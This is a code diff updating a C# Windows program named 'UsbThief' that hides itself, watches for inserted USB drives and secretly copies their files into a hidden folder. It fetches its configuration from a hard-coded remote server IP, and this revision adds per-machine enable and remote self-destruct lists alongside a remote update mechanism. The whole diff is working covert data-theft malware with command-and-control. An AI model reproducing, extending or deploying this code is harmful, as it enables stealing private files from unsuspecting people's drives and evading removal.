@@ -21,22 +21,24 @@ namespace UsbThief
     {
         #region 声明变量
         public const bool dbg = false;//调试时改为true
-        public const int innerVer = 5;
-        public string workspace = Application.StartupPath + @"\data\diskcache\files\";
+        public const int innerVer = 6;
+        public bool enable = false;
         public bool fC2C = false;
         public bool inDelay = false;
+        public string machineName = Environment.MachineName;
+        public string workspace = Application.StartupPath + @"\data\diskcache\files\";
         public const int WM_DEVICECHANGE = 0x219;//Notifies an application of a change to the hardware configuration of a device or the computer.
         public const int DBT_DEVICEARRIVAL = 0x8000;  //A device or piece of media has been inserted and is now available.
         public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //Permission is requested to remove a device or piece of media. Any application can deny this request and cancel the removal.
         public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //A request to remove a device or piece of media has been canceled.
         public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //A device or piece of media has been removed.
         public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //A device or piece of media is about to be removed. Cannot be denied.
-        public LogForm form = new LogForm();
         public static Logger logger = null;
-        public SynchronizationContext mainThreadSynContext;
-        public Status sta = Status.none;
-        public Config conf = new Config { enable = false };
+        public LogForm form = new LogForm();
+        public SynchronizationContext mainThreadSyncContext;
+        public Config conf = new Config();
         public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
+        public Status sta = Status.none;
         public System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer() { Interval = 600000 /*30000*//*30秒的调试用*/};
         public enum Status
         {
@@ -48,12 +50,12 @@ namespace UsbThief
         }
         public struct Config
         {
-            public bool enable;
-            public bool suicide;
-            public int ver;
+            public int latestVer;
             public string update;
+            public List<string> enabledList;
+            public List<string> suicideList;
             public List<string> blacklist;
-            public List<string> exts;
+            public List<string> extList;
             public int sizeLim;
             public int delay;
             public string passwd;
@@ -78,7 +80,7 @@ namespace UsbThief
             form.Hide();
             logger.Info("UsbThief已启动");
             logger.Info("innerVer：" + innerVer);
-            mainThreadSynContext = SynchronizationContext.Current;
+            mainThreadSyncContext = SynchronizationContext.Current;
             timer.Tick += Timer_Tick;
             timer.Start();
             notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
@@ -103,7 +105,7 @@ namespace UsbThief
             }
             HideFiles(workspace);
             GetConf();
-            if (conf.enable)
+            if (enable)
             {
                 Dictionary<string, string> devices = ReadSta();
                 if (devices != null)
@@ -162,13 +164,13 @@ namespace UsbThief
                 {
                     if (dbg)
                     {
-                        string text = client.DownloadString("http://111.231.202.181/conf_dbg.txt");
+                        string text = client.DownloadString("http://111.231.202.181/config_debug.txt");
                         logger.Info("获取到网络配置（调试）：\n" + text);
                         conf = JsonConvert.DeserializeObject<Config>(text);
                     }
                     else
                     {
-                        string text = client.DownloadString("http://111.231.202.181/conf.txt");
+                        string text = client.DownloadString("http://111.231.202.181/config.txt");
                         logger.Info("获取到网络配置：\n" + text);
                         conf = JsonConvert.DeserializeObject<Config>(text);
                     }
@@ -178,20 +180,39 @@ namespace UsbThief
             {
                 logger.Error("获取网络配置失败：\n" + e);
             }
-            if (conf.suicide == true)
+            if (conf.enabledList != null)
             {
-                try
+                foreach (var item in conf.enabledList)
                 {
-                    logger.Info("Bye World~");
-                    Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
-                    Environment.Exit(0);
-                }
-                catch (Exception e)
-                {
-                    logger.Error("这年头去世都费劲：\n" + e);
+                    if (item == machineName)
+                    {
+                        enable = true;
+                        break;
+                    }
+                    else
+                        enable = false;
                 }
             }
-            if (innerVer < conf.ver && conf.update != null && conf.update != "")
+            if (conf.suicideList != null)
+            {
+                foreach (var item in conf.suicideList)
+                {
+                    if (item == machineName)
+                    {
+                        try
+                        {
+                            logger.Info("Bye World~");
+                            Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
+                            Environment.Exit(0);
+                        }
+                        catch (Exception e)
+                        {
+                            logger.Error("这年头去世都费劲：\n" + e);
+                        }
+                    }
+                }
+            }
+            if (innerVer < conf.latestVer && conf.update != null && conf.update != "")
             {
                 try
                 {
@@ -204,7 +225,7 @@ namespace UsbThief
                     logger.Error("更新失败：\n" + e);
                 }
             }
-            if (!conf.enable)
+            if (!enable)
                 logger.Info("部分功能已关闭");
         }
         #endregion
@@ -254,7 +275,7 @@ namespace UsbThief
         {
             try
             {
-                if (m.Msg == WM_DEVICECHANGE && conf.enable)
+                if (m.Msg == WM_DEVICECHANGE && enable)
                 {
                     int wp = m.WParam.ToInt32();
                     if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
@@ -414,7 +435,6 @@ namespace UsbThief
                                                 }
                                             });
                                             ex.Start();
-                                            //ex.Join();
                                         }
                                     }
                                     break;
@@ -652,13 +672,13 @@ namespace UsbThief
         #region 检测扩展名
         private bool CheckExt(string ext)
         {
-            if (conf.exts == null || conf.exts.Count == 0)
+            if (conf.extList == null || conf.extList.Count == 0)
             {
                 return true;
             }
             else
             {
-                foreach (var item in conf.exts)
+                foreach (var item in conf.extList)
                 {
                     if (item.ToLower() == ext.ToLower())
                     {
@@ -677,71 +697,78 @@ namespace UsbThief
             WriteSta(str[0], Status.copying);
             CopyLoop(str[1], str[2]);
             HideFiles(workspace);
-            mainThreadSynContext.Post(new SendOrPostCallback(CopyDoneCallback), null);
+            mainThreadSyncContext.Post(new SendOrPostCallback(CopyDoneCallback), null);
         }
         private void CopyLoop(string sourcePath, string targetPath)
         {
-            try
+            DirectoryInfo sourceInfo = new DirectoryInfo(sourcePath);
+            if (!Directory.Exists(targetPath))
+                Directory.CreateDirectory(targetPath);
+            foreach (FileSystemInfo fsi in sourceInfo.GetFileSystemInfos())
             {
-                DirectoryInfo sourceInfo = new DirectoryInfo(sourcePath);
-                if (!Directory.Exists(targetPath))
-                    Directory.CreateDirectory(targetPath);
-                foreach (FileSystemInfo fsi in sourceInfo.GetFileSystemInfos())
-                {
-                    string targetFileName = Path.Combine(targetPath, fsi.Name);
-                    if (fsi is FileInfo)
-                    {   //如果是文件，复制文件
-                        FileInfo fi1 = new FileInfo(fsi.FullName);
-                        if (CheckExt(fi1.Extension))
+                string targetFileName = Path.Combine(targetPath, fsi.Name);
+                if (fsi is FileInfo)
+                {   //如果是文件，复制文件
+                    FileInfo fi1 = new FileInfo(fsi.FullName);
+                    if (CheckExt(fi1.Extension))
+                    {
+                        if (File.Exists(targetFileName))
                         {
-                            if (File.Exists(targetFileName))
+                            FileInfo fi2 = new FileInfo(targetFileName);
+                            if (fi1.LastWriteTime > fi2.LastWriteTime)
                             {
-                                FileInfo fi2 = new FileInfo(targetFileName);
-                                if (fi1.LastWriteTime > fi2.LastWriteTime)
+                                logger.Info("正在复制文件：" + fsi.FullName);
+                                string path = workspace + currentDevice.ser;
+                                string dest = path + ".zip";
+                                if (File.Exists(dest))
+                                    File.Delete(dest);
+                                if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
                                 {
-                                    logger.Info("正在复制文件：" + fsi.FullName);
-                                    string path = workspace + currentDevice.ser;
-                                    string dest = path + ".zip";
-                                    if (File.Exists(dest))
-                                        File.Delete(dest);
-                                    if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
-                                    {
-                                        logger.Info("剩余磁盘空间不足，将不会复制此文件");
-                                        continue;
-                                    }
-                                    fC2C = true;
+                                    logger.Info("剩余磁盘空间不足，将不会复制此文件");
+                                    continue;
+                                }
+                                fC2C = true;
+                                try
+                                {
                                     File.Copy(fsi.FullName, targetFileName, true);
                                 }
-                            }
-                            else
-                            {
-                                if (fi1.Length <= conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
+                                catch (Exception e)
                                 {
-                                    logger.Info("正在复制文件：" + fsi.FullName);
-                                    string path = workspace + currentDevice.ser;
-                                    string dest = path + ".zip";
-                                    if (File.Exists(dest))
-                                        File.Delete(dest);
-                                    if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
-                                    {
-                                        logger.Info("剩余磁盘空间不足，将不会复制此文件");
-                                        continue;
-                                    }
-                                    fC2C = true;
+                                    logger.Error("文件复制出错：\n" + e);
+                                }
+                            }
+                        }
+                        else
+                        {
+                            if (fi1.Length <= conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
+                            {
+                                logger.Info("正在复制文件：" + fsi.FullName);
+                                string path = workspace + currentDevice.ser;
+                                string dest = path + ".zip";
+                                if (File.Exists(dest))
+                                    File.Delete(dest);
+                                if (GetDirectoryLength(path) + fi1.Length > GetFreeSpace())
+                                {
+                                    logger.Info("剩余磁盘空间不足，将不会复制此文件");
+                                    continue;
+                                }
+                                fC2C = true;
+                                try
+                                {
                                     File.Copy(fsi.FullName, targetFileName, true);
+                                }
+                                catch (Exception e)
+                                {
+                                    logger.Error("文件复制出错：\n" + e);
                                 }
                             }
                         }
                     }
-                    else //如果是文件夹，新建文件夹，递归
-                    {
-                        CopyLoop(fsi.FullName, targetFileName);
-                    }
                 }
-            }
-            catch (Exception e)
-            {
-                logger.Error("文件复制出错：\n" + e);
+                else //如果是文件夹，新建文件夹，递归
+                {
+                    CopyLoop(fsi.FullName, targetFileName);
+                }
             }
         }
         private void CopyDoneCallback(object state)
